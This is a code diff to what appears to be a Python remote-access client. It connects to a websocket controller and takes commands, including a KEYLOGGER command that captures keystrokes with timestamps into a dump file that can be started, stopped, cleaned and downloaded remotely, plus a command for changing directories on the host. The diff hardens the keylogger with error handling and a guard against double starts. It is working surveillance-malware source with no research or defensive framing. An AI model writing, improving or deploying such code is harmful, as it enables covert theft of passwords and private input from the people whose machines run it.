@@ -38,10 +38,13 @@ def keylogger():
         if klgr == True:
             if not key in pressed_keys or not pressed_keys[key]:
                 pressed_keys[key]=True
-                with open(keylogger_file, 'a') as f:
-                    now = datetime.now()  # current date and time
-                    f.write(f'{now.strftime("%d.%G.%d %H:%M:%S:%f")} \t {key}\n')
-                    f.close()
+                try:
+                    with open(keylogger_file, 'a') as f:
+                        now = datetime.now()  # current date and time
+                        f.write(f'{now.strftime("%d.%G.%d %H:%M:%S:%f")} \t {key}\n')
+                        f.close()
+                except:
+                    pass
     def on_release(key):
         if klgr == True:
             pressed_keys[key]=False
@@ -51,6 +54,8 @@ def keylogger():
 
 async def client():
     # print("Start Test")
+    global klgr
+    global keylogger_file
     try:
         print("Trying to connect...")
         async with websockets.connect('ws://127.0.0.1:8000') as websocket:
@@ -248,18 +253,27 @@ async def client():
                         output.append(str("-1"))
                         output.append(str(e))
                 elif request== "KEYLOGGER":
-                    global klgr
-                    global keylogger_file
                     try:
                         if args[0].upper() == "START":
-                            klgr = True
-                            with open(keylogger_file, 'w') as f:
-                                now = datetime.now()  # current date and time
-                                f.write("Started "+now.strftime("%d.%G.%d %H:%M:%S:%f:\n"))
-                                f.close()
-                            Thread(target=keylogger, daemon=True).start()
-                            output.append(str("Keylogger session is started"))
-                            output.append(str(keylogger_file))
+                            if not klgr:
+                                klgr = True
+                                try:
+                                    with open(keylogger_file, 'w') as f:
+                                        now = datetime.now()  # current date and time
+                                        f.write("Started "+now.strftime("%d.%G.%d %H:%M:%S:%f:\n"))
+                                        f.close()
+                                    Thread(target=keylogger, daemon=True).start()
+                                    output.append(str("Keylogger session is started"))
+                                    output.append(str(keylogger_file))
+                                except Exception as e:
+                                    status = "ERROR"
+                                    output.append(str("-1"))
+                                    output.append(str(e))
+                            else:
+                                status = "WARNING"
+                                output.append(str("Keylogger is already running!"))
+
+
                         elif args[0].upper() == "STOP":
                             klgr = False
                             output.append(str("Keylogger session is stopped, you can still download the dump file!"))
@@ -270,19 +284,23 @@ async def client():
                             for line in logging:
                                 output.append(str(line))
                         elif args[0].upper() == "CLEAN":
-                            with open(keylogger_file, 'w') as f:
-                                now = datetime.now()  # current date and time
-                                f.write("Started "+now.strftime("%d.%G.%d %H:%M:%S:%f:\n"))
-                                f.close()
-                            output.append(str("Keylogger logfile cleaned"))
-                            output.append(str(keylogger_file))
-
+                            try:
+                                with open(keylogger_file, 'w') as f:
+                                    now = datetime.now()  # current date and time
+                                    f.write("Cleaned "+now.strftime("%d.%G.%d %H:%M:%S:%f:\n"))
+                                    f.close()
+                                output.append(str("Keylogger logfile cleaned"))
+                                output.append(str(keylogger_file))
+                            except Exception as e:
+                                status = "ERROR"
+                                output.append(str("-1"))
+                                output.append(str(e))
                         else:
                             output.append(f"Unknown subcommand: {str(args[0])}")
                     except:
                         output.append(f"Keylogger is running: {str(klgr)}")
+
                 elif request == "CD":
-                    # Get geolocation and
                     try:
                         # try:
                         os.chdir(args[0])
